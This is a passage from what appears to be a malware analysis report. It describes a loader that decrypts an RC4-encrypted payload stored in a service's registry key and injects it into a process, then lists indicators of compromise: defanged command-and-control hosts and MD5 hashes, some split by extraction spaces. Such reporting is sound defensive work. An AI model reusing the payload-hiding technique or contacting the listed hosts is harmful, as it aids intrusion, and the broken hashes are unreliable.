\nservice. If it fails it falls back to regular standalone executable mode. Main purpose of this code \nis to find payload in the registry, decrypt it and inject into target process memory. The payload is \nstored in the following registry value:  \nHKLM \\SYSTEM \\CurrentControlSet \\services \\%servicename% \\Security \\Data2  It is encrypted with RC4, and key is taken from the registry using the following binary value (16 \nbytes): HKLM \\SYSTEM \\CurrentControlSet \\services \\%servicename% \\Security \\Data3 . \n \nThe cryptocontainer used by this module contains a magic value after it's decrypted with MD5 of \nthe secret passed via commandline and hardcoded RC4 key. At offset 4 it has to contain the \nfollowing DWORD: 0xBC0F1DAD  (AD 1D 0F BC).  \n \nAppendix: Indicator of Compromise  \nMalware Hosts  \nsap.misapor[.]ch  \ntradeboard.mefound[.]com:443  \nmovis-es.ignorelist[.]com:443  \nupdate.toythieves[.]com:8080  \nupdate.toythieves[.]com:443  \nexbonus.mrbasic[.]com:443  \n \nMalware Hashes  \n02f75c2b47b1733f1889d6bbc026157c  \n06cd99f0f9f152655469156059a8ea25  \n07e13b985c79ef10802e75aadfac6408  \n09a77c0cb8137df82efc0de5c7fee46e  \n0abdaebbdbd5e6507e6db15f628d6fd7  \n16a278d0ec24458c8e47672529835117  \n17bc6f5b672b7e128cd5df51cdf10d37  \n198760a270a19091582a5bd841fbaec0  \n1bfbc0c9e0d9ceb5c3f4f6ced 6bcfeae \n1d0e79feb6d7ed23eb1bf7f257ce4fee  \n268dca9ad0dcb4d95f95a80ec621924f  \n2963cd266e54bd136a966bf491507bbf  \n2de01aac95f8703163da7633993fb447  \n2ef2703cfc9f6858ad9527588198b1b6  \n3b1dfeb298d0fb27c31944907d900c1d  \n459593079763f4ae74986070f47452cf  \n474f08fb4a0b8c9e1b88349098de10b1  \n579e45a09dc2370c71515bd0870b2078  \n5d0ffbc8389f27b0649696f0ef5b3cfe  \n5ebfe9a9ab9c2c4b200508ae5d91f067  \n5fbfeec97e967325af49fa4f65bb2265  \n6eec1de7708020a25ee38a0822a59e88  \n7413f08e12f7a4b48342a4b530c8b785  \n8387ceba0c020a650e1add75d 24967f2 \n85d316590edfb4212049c4490db08c4b  \n949e1e35e09b25fca3927d3878d72bf4  \n954f50301207c52e7616cc490b8b4d3c  \n9d1db33d89ce9d44354dcba9ebba4c2d  ad5485fac7fed74d112799600edb2fbf  \nb135a56b0486eb4c85e304e636996ba1  \nb9be8d53542f5b4abad4687a891b1c03  \nbbd703f0d6b1cad4f f8f3d2ee3cc073c  \nc1364bbf63b3617b25b58209e4529d8c  \nc635e0aa816ba5fe6500ca9ecf34bd06  \ncb65d885f4799dbdf80af2214ecdc5fa  \nce6e55abfe1e7767531eaf1036a5db3d  \ne29fe3c181ac9ddbb242688b151f3310  \ne62a52073fd7bfd251efca9906580839  \nf5e0f57684e9da7ef96dd459b554fded  \nfde55de11 7cc611826db0983bc054624  \n \n "
}